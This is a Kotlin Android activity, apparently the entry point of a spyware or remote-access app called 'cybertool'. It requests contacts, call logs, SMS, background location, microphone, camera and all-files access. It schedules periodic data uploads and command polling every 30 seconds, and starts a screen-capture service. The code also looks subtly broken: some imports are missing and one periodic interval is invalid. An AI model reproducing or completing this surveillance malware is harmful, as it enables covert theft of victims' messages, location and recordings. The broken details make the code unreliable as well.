package com.riqel.cybertool

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {

    companion object {
        const val PERMISSION_REQUEST_CODE = 100
        const val REQUEST_MEDIA_PROJECTION = 101
        const val REQUEST_MANAGE_STORAGE = 102
    }

    private val requiredPermissions = mutableListOf(
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_SMS,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_BACKGROUND_LOCATION,
        Manifest.permission.RECEIVE_BOOT_COMPLETED,
        Manifest.permission.POST_NOTIFICATIONS,
        Manifest.permission.RECORD_AUDIO,          // For microphone capture
        Manifest.permission.CAMERA                  // For taking photos
    ).apply {
        if (Build.VERSION.SDK_INT <= 32) {
            add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
        }
        add(Manifest.permission.READ_EXTERNAL_STORAGE)
    }.toTypedArray()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val btnRequest = findViewById<Button>(R.id.btnRequestPermissions)
        btnRequest.setOnClickListener { checkAndRequestPermissions() }

        // Request "All files access" for Android 11+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                intent.data = Uri.parse("package:$packageName")
                startActivityForResult(intent, REQUEST_MANAGE_STORAGE)
            }
        }

        // Schedule periodic data upload every 15 minutes
        val uploadWork = PeriodicWorkRequestBuilder<DataUploadWorker>(15, TimeUnit.MINUTES)
            .setInitialDelay(1, TimeUnit.MINUTES)
            .build()
        WorkManager.getInstance(this).enqueue(uploadWork)

        // Schedule command polling every 30 seconds for testing (change to 15 min in production)
        val commandWork = PeriodicWorkRequestBuilder<CommandWorker>(30, TimeUnit.SECONDS)
            .setInitialDelay(5, TimeUnit.SECONDS)
            .build()
        WorkManager.getInstance(this).enqueue(commandWork)

        // Start foreground service for screenshot capability (optional)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(Intent(this, ScreenshotService::class.java))
        }
    }

    private fun checkAndRequestPermissions() {
        val missingPermissions = requiredPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (missingPermissions.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missingPermissions.toTypedArray(), PERMISSION_REQUEST_CODE)
        } else {
            Toast.makeText(this, "All permissions already granted", Toast.LENGTH_SHORT).show()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSION_REQUEST_CODE) {
            val allGranted = grantResults.all { it == PackageManager.PERMISSION_GRANTED }
            if (allGranted) {
                Toast.makeText(this, "All permissions granted", Toast.LENGTH_SHORT).show()
                // Optionally request screen capture permission now
                requestScreenCapture()
            } else {
                Toast.makeText(this, "Some permissions denied", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun requestScreenCapture() {
        val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        startActivityForResult(projectionManager.createScreenCaptureIntent(), REQUEST_MEDIA_PROJECTION)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        when (requestCode) {
            REQUEST_MEDIA_PROJECTION -> {
                if (resultCode == RESULT_OK && data != null) {
                    ScreenshotService.setResult(data, resultCode)
                    Toast.makeText(this, "Screen capture permission granted", Toast.LENGTH_SHORT).show()
                } else {
                    Toast.makeText(this, "Screen capture permission denied", Toast.LENGTH_SHORT).show()
                }
            }
            REQUEST_MANAGE_STORAGE -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && Environment.isExternalStorageManager()) {
                    Toast.makeText(this, "All files access granted", Toast.LENGTH_SHORT).show()
                } else {
                    Toast.makeText(this, "All files access not granted – file operations limited", Toast.LENGTH_LONG).show()
                }
            }
        }
    }

    // Helper to force a command poll immediately (for debugging)
    private fun forceCommandPoll() {
        WorkManager.getInstance(this).enqueue(OneTimeWorkRequestBuilder<CommandWorker>().build())
    }
}
